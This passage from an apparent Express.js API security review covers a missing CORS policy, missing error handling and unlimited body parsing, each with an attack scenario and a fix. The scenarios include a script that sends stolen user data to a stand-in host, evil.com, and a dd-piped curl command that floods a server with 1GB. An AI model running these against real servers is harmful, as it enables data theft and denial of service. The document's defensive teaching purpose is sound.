### 6. ❌ No CORS Policy

**Issue:**
No CORS configuration means any website can make requests to your API.

**Attack Scenario:**
```html
<!-- Malicious site: evil.com -->
<script>
  fetch('http://yourserver.com:3000/users')
    .then(r => r.json())
    .then(data => {
      // Steal user data and send to attacker
      fetch('http://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

**Fix:**
```javascript
const cors = require('cors');

const corsOptions = {
  origin: function (origin, callback) {
    const whitelist = [
      'https://yourdomain.com',
      'https://app.yourdomain.com'
    ];
    if (whitelist.indexOf(origin) !== -1 || !origin) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
};

app.use(cors(corsOptions));
```

---

### 7. ❌ No Error Handling

**Issue:**
No error handling means:
- Stack traces exposed to clients
- Server crashes on errors
- Information leakage
- No logging of errors

**Attack Scenario:**
```bash
# Trigger an error to see internal structure
curl http://localhost:3000/users/invalid
# Response might show:
# - File paths
# - Database structure
# - Dependencies and versions
# - Code snippets
```

**Fix:**
```javascript
// Global error handler
app.use((err, req, res, next) => {
  // Log error internally
  console.error({
    message: err.message,
    stack: err.stack,
    url: req.originalUrl,
    method: req.method,
    timestamp: new Date().toISOString()
  });

  // Send safe error to client
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production' 
      ? 'Internal server error' 
      : err.message
  });
});
```

---

### 8. ❌ No Request Body Parsing with Limits

**Issue:**
If you add body parsing without limits, attackers can DoS your server.

**Attack Scenario:**
```bash
# Send 1GB payload
dd if=/dev/zero bs=1M count=1024 | curl -X POST \
  http://localhost:3000/api/users \
  -H "Content-Type: application/json" \
  --data-binary @-
# Server runs out of memory and crashes
```

**Fix:**
```javascript
// Limit request body size
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));
```

